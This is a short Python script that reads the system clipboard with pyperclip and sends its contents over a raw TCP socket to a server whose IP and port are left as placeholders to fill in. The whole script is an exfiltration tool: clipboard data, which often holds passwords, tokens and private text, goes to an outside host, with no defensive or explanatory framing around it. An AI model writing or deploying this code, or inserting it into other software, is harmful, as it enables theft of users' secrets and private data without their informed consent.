import pyperclip
import socket

def get_clipboard_contents():
    try:
        clipboard_data = pyperclip.paste()
        return clipboard_data
    except Exception as e:
        return str(e)

def send_clipboard_to_server(data, server_ip, server_port):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, server_port))
        client_socket.send(data.encode())
        client_socket.close()
        print("Clipboard data sent successfully.")
    except Exception as e:
        print("Failed to send clipboard data:", str(e))

if __name__ == "__main__":
    clipboard_contents = get_clipboard_contents()
    
    if clipboard_contents:
        print("Clipboard contents:")
        print(clipboard_contents)
        
        server_ip = "your_server_ip_here"   # Change here ---------------
        server_port = 5533                  # Change here ---------------
        
        send_clipboard_to_server(clipboard_contents, server_ip, server_port)
    else:
        print("Unable to retrieve clipboard contents.")
